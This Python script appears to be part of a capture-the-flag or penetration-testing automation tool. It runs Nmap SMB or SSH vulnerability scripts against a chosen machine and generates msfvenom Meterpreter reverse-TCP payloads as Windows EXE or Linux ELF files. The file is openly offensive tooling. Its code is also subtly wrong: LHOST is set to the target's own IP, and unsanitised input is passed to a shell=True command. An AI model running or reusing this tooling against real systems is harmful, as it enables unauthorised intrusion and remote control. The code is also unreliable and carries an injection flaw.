# This script adds the following functionality to the previous scripts:
# 
# 1. Advanced Nmap Scripts:
# - The script will run advanced Nmap scripts based on the machine type. For Windows, it will run SMB vulnerability scripts, and for Linux, it will run SSH vulnerability scripts. If the machine type is unknown, it will run default scripts.
# 
# 2. Payload Generation:
# - The script will generate payloads using msfvenom based on the machine type. For Windows, it will generate a Meterpreter reverse TCP payload in EXE format, and for Linux, it will generate a Meterpreter reverse TCP payload in ELF format.

import os
import subprocess

# ... [Previous functions: get_user_input, setup_directory_structure, install_tools, initial_nmap_scan]

def advanced_nmap_scan(machine_ip, machine_type, base_dir):
    """Run advanced Nmap scripts based on the machine type and open ports."""
    nmap_dir = os.path.join(base_dir, "nmap")
    vulnscan_file = os.path.join(nmap_dir, "vulnscan.txt")
    
    # Determine which Nmap scripts to run based on the machine type
    if machine_type == "Windows":
        scripts = "smb-vuln*"
    elif machine_type == "Linux":
        scripts = "ssh-vuln*"
    else:
        scripts = "default"
    
    # Run the advanced Nmap scan
    subprocess.run(["nmap", "--script", scripts, "-oN", vulnscan_file, machine_ip])

def generate_payloads(machine_ip, machine_type, base_dir):
    """Generate payloads based on the machine type and Nmap scan results."""
    payloads_dir = os.path.join(base_dir, "payloads")
    
    # Determine which payloads to generate based on the machine type
    if machine_type == "Windows":
        payload = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={machine_ip} LPORT=4444 -f exe > {payloads_dir}/windows_payload.exe"
    elif machine_type == "Linux":
        payload = f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={machine_ip} LPORT=4444 -f elf > {payloads_dir}/linux_payload.elf"
    else:
        print("Unknown machine type. Cannot generate payload.")
        return

    # Generate the payload
    subprocess.run(payload, shell=True)

def main():
    handle, machine_name, machine_ip, machine_type = get_user_input()
    base_dir = setup_directory_structure(machine_name)
    print(f"Directory structure set up at: {base_dir}")

    install_tools(base_dir)
    print("Tools installed.")

    if not machine_type:
        machine_type = initial_nmap_scan(machine_ip, base_dir)
        print(f"Machine type determined as: {machine_type}")
    else:
        print(f"Machine type provided as: {machine_type}")

    advanced_nmap_scan(machine_ip, machine_type, base_dir)
    print("Advanced Nmap scan completed.")

    generate_payloads(machine_ip, machine_type, base_dir)
    print("Payloads generated.")

if __name__ == "__main__":
    main()
